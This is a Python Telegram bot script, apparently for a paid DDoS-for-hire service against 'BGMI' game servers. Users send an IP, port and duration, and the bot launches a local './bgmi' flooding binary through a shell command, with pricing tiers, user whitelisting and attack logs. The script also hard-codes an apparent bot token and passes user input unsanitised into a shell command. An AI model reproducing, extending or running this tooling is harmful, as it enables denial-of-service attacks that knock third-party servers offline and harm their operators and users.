#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import signal
from telebot import types

# insert your Telegram bot token here
bot = telebot.TeleBot('8279142566:AAE7719-93KPDHFXc0q8Y1eMCKJ_FUOpk0E')

# Admin user IDs
admin_id = ["6132441793"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Biến toàn cục lưu process bgmi và target
bgmi_process = None
last_target = None

# ---------------- Helpers ----------------
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ---------------- Admin Commands ----------------
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            new_user = command[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                with open(USER_FILE, "a") as f:
                    f.write(f"{new_user}\n")
                bot.reply_to(message, f"User {new_user} added ✅")
            else:
                bot.reply_to(message, "User already exists ❌")
        else:
            bot.reply_to(message, "Usage: /add <userid>")
    else:
        bot.reply_to(message, "Only Admin ❌")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            uid = command[1]
            if uid in allowed_user_ids:
                allowed_user_ids.remove(uid)
                with open(USER_FILE, "w") as f:
                    for u in allowed_user_ids: f.write(f"{u}\n")
                bot.reply_to(message, f"User {uid} removed ✅")
            else:
                bot.reply_to(message, f"User {uid} not found ❌")
        else:
            bot.reply_to(message, "Usage: /remove <userid>")
    else:
        bot.reply_to(message, "Only Admin ❌")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    if str(message.chat.id) in admin_id:
        open(LOG_FILE, "w").close()
        bot.reply_to(message, "Logs cleared ✅")
    else:
        bot.reply_to(message, "Only Admin ❌")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if str(message.chat.id) in admin_id:
        try:
            with open(USER_FILE, "r") as f:
                data = f.read().splitlines()
                if data:
                    bot.reply_to(message, "Users:\n" + "\n".join(data))
                else:
                    bot.reply_to(message, "No users ❌")
        except:
            bot.reply_to(message, "No users ❌")
    else:
        bot.reply_to(message, "Only Admin ❌")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    if str(message.chat.id) in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "No logs ❌")
    else:
        bot.reply_to(message, "Only Admin ❌")

# ---------------- User Commands ----------------
@bot.message_handler(commands=['id'])
def show_id(message):
    bot.reply_to(message, f"ID Telegram của bạn là: {message.chat.id}")

bgmi_cooldown = {}

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global bgmi_process
    uid = str(message.chat.id)
    if uid not in allowed_user_ids:
        bot.reply_to(message, "❌ Unauthorized")
        return

    command = message.text.split()
    if len(command) == 4:
        target, port, time = command[1], int(command[2]), int(command[3])
        if time > 181:
            bot.reply_to(message, "⚠️ Max time 181s")
            return

        record_command_logs(uid, '/bgmi', target, port, time)
        log_command(uid, target, port, time)
        bot.reply_to(message, f"🔥 Attack Started!\n{target}:{port} for {time}s")

        full_cmd = f"./bgmi {target} {port} {time} 200"
        bgmi_process = subprocess.Popen(full_cmd, shell=True, preexec_fn=os.setsid)
    else:
        bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME>")

@bot.message_handler(commands=['stop'])
def stop_bgmi(message):
    global bgmi_process
    if bgmi_process and bgmi_process.poll() is None:
        os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
        bgmi_process = None
        bot.reply_to(message, "✅ Attack stopped")
    else:
        bot.reply_to(message, "⚠️ No running attack")

@bot.message_handler(commands=['mylogs'])
def mylogs(message):
    uid = str(message.chat.id)
    if uid not in allowed_user_ids:
        bot.reply_to(message, "❌ Unauthorized")
        return
    try:
        with open(LOG_FILE, "r") as f:
            logs = [l for l in f if f"UserID: {uid}" in l]
            bot.reply_to(message, "Your logs:\n" + "".join(logs) if logs else "No logs ❌")
    except:
        bot.reply_to(message, "No logs ❌")

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message, '''🤖 Commands:
💥 /bgmi <IP> <PORT> <TIME>
💥 /stop - Stop running attack
💥 /mylogs - View your logs
💥 /rules - Usage rules
💥 /plan - Pricing

Admin:
💥 /add, /remove, /allusers, /logs, /clearlogs, /broadcast
''')

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, f"👋 Welcome {message.from_user.first_name}\nUse /help")

@bot.message_handler(commands=['rules'])
def rules(message):
    bot.reply_to(message, "⚠️ Rules:\n1. Don't spam\n2. Don't run 2 attacks at once\n3. Logs checked daily")

@bot.message_handler(commands=['plan'])
def plan(message):
    bot.reply_to(message, "VIP 🌟: 180s attack, 5min cooldown, 3 concurrent\n1day=15k, 3days=40k")

@bot.message_handler(commands=['admincmd'])
def admincmd(message):
    bot.reply_to(message, "Admin: /add, /remove, /allusers, /logs, /broadcast, /clearlogs")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.chat.id) in admin_id:
        parts = message.text.split(maxsplit=1)
        if len(parts) > 1:
            msg = "⚠️ Admin Broadcast:\n\n" + parts[1]
            with open(USER_FILE, "r") as f:
                for uid in f.read().splitlines():
                    try: bot.send_message(uid, msg)
                    except: pass
            bot.reply_to(message, "Broadcast sent ✅")
        else:
            bot.reply_to(message, "Usage: /broadcast <msg>")
    else:
        bot.reply_to(message, "Only Admin ❌")

# ---------------- Inline Keyboard (IP:PORT) ----------------
@bot.message_handler(func=lambda m: ":" in m.text and m.text.count(".") == 3)
def detect_target(message):
    global last_target
    try:
        ip, port = message.text.split(":")
        ip, port = ip.strip(), int(port.strip())
        last_target = (ip, port)

        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("🚀 Attack", callback_data="attack"),
            types.InlineKeyboardButton("⛔ Stop", callback_data="stop")
        )

        bot.reply_to(message, f"🎯 Target Detected:\n{ip}:{port}\n\nChoose action:", reply_markup=markup)
    except:
        bot.reply_to(message, "⚠️ Invalid format. Use IP:PORT")

@bot.callback_query_handler(func=lambda call: True)
def inline_buttons(call):
    global last_target, bgmi_process
    if call.data == "attack":
        if not last_target:
            bot.answer_callback_query(call.id, "❌ No target")
            return
        ip, port = last_target
        time = 60  # mặc định 60s
        full_cmd = f"./bgmi {ip} {port} {time} 200"
        bgmi_process = subprocess.Popen(full_cmd, shell=True, preexec_fn=os.setsid)
        bot.send_message(call.message.chat.id, f"🔥 Attack Started!\n{ip}:{port}")
    elif call.data == "stop":
        if bgmi_process and bgmi_process.poll() is None:
            os.killpg(os.getpgid(bgmi_process.pid), signal.SIGTERM)
            bgmi_process = None
            bot.send_message(call.message.chat.id, "✅ Attack stopped")
        else:
            bot.send_message(call.message.chat.id, "⚠️ No running attack")

# ---------------- Run Bot ----------------
bot.polling()

